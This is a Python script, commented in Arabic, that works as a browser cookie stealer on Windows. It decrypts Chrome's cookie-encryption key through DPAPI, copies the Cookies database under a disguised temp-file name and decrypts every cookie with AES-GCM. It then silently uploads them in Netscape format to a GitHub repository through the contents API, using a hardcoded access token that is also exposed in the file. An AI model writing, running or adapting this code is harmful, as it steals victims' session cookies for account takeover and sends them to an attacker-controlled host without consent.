import os, json, base64, sqlite3, shutil, requests, time

TOKEN = "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"
REPO = "Noor092324/Noor-config"

def get_it_all():
    # مسارات كروم
    base = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data')
    l_state = os.path.join(base, 'Local State')
    db_path = os.path.join(base, 'Default', 'Network', 'Cookies')
    
    if not os.path.exists(db_path): return

    try:
        import win32crypt
        from Crypto.Cipher import AES
        
        # نسخة مؤقتة للعمل
        tmp = os.path.join(os.environ['TEMP'], 'sys_temp.db')
        shutil.copy2(db_path, tmp)
        
        # فك شفرة المفتاح
        with open(l_state, "r", encoding="utf-8") as f:
            k = json.loads(f.read())["os_crypt"]["encrypted_key"]
        m_key = win32crypt.CryptUnprotectData(base64.b64decode(k)[5:], None, None, None, 0)[1]
        
        db = sqlite3.connect(tmp)
        rows = db.execute("SELECT host_key, name, encrypted_value FROM cookies").fetchall()
        
        # تجميع الكوكيز بصيغة Netscape (زي ما بدك)
        cookies_text = ""
        for h, n, e in rows:
            try:
                c = AES.new(m_key, AES.MODE_GCM, e[3:15])
                v = c.decrypt(e[15:])[:-16].decode()
                cookies_text += f"{h}\tTRUE\t/\tFALSE\t0\t{n}\t{v}\n"
            except: continue
        
        db.close()
        os.remove(tmp)

        # إرسال الكوكيز مباشرة لملف Noor.json
        if cookies_text:
            send_to_github(cookies_text)
    except: pass

def send_to_github(full_data):
    api = f"https://api.github.com/repos/{REPO}/contents/Noor.json"
    headers = {"Authorization": f"token {TOKEN}"}
    try:
        # جلب SHA الحالي للملف
        res = requests.get(api, headers=headers).json()
        sha = res["sha"]
        
        # تجهيز البيانات (الكوكيز كاملة داخل الملف)
        final_json = {
            "update_time": time.ctime(),
            "cookies_data": full_data
        }
        
        encoded = base64.b64encode(json.dumps(final_json).encode()).decode()
        requests.put(api, headers=headers, json={
            "message": "Direct Cookies Sync",
            "content": encoded,
            "sha": sha
        })
    except: pass

if __name__ == "__main__":
    get_it_all()
    
